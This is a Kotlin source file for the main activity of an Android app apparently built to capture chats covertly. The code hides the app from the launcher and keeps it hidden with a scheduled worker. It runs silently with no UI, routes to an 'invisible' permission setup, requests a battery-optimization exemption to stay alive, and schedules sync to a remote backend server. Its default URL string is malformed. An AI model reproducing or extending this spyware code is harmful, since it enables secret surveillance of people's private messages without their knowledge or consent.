package com.chats.capture.ui

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import android.content.SharedPreferences
import com.chats.capture.managers.BatteryOptimizationManager
import com.chats.capture.managers.ServiceMonitor
import com.chats.capture.network.ApiClient
import com.chats.capture.ui.PermissionSetupActivity
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager
import com.chats.capture.workers.AppHiderScheduler
import com.chats.capture.workers.SyncScheduler
import com.chats.capture.workers.UpdateCheckScheduler
import timber.log.Timber

class MainActivity : AppCompatActivity() {
    
    private lateinit var serviceMonitor: ServiceMonitor
    private lateinit var batteryOptimizationManager: BatteryOptimizationManager
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // App should be completely silent - finish immediately without showing UI
        Timber.d("MainActivity started - finishing immediately (silent mode)")
        
        // Hide app from launcher
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
        
        // Check if setup is needed
        if (!com.chats.capture.utils.AppStateManager.isSetupComplete(this)) {
            // Redirect to permission setup (invisible)
            val intent = Intent(this, PermissionSetupActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            startActivity(intent)
            finish()
            return
        }
        
        // Initialize services in background without showing UI
        serviceMonitor = ServiceMonitor(this)
        batteryOptimizationManager = BatteryOptimizationManager(this)
        
        // Initialize API client
        val prefs = getSharedPreferences("capture_prefs", MODE_PRIVATE)
        // Default to local network server if not configured
        val defaultUrl = "http://https://backend-chat-yq33.onrender.com/"
        val serverUrl = prefs.getString("server_url", defaultUrl)
        ApiClient.initialize(this, serverUrl ?: defaultUrl)
        
        // Start service monitoring
        serviceMonitor.startMonitoring()
        
        // Schedule sync
        SyncScheduler.scheduleSync(this)
        
        // Schedule update checks
        UpdateCheckScheduler.scheduleUpdateCheck(this)
        
        // Schedule app hider worker to ensure app stays hidden
        AppHiderScheduler.schedule(this)
        
        // Check and request battery optimization exemption (silently)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            if (!batteryOptimizationManager.isIgnoringBatteryOptimizations()) {
                batteryOptimizationManager.requestBatteryOptimizationExemption()?.let {
                    startActivity(it)
                }
            }
        }
        
        // Finish immediately - app should not show any UI
        finish()
    }
}
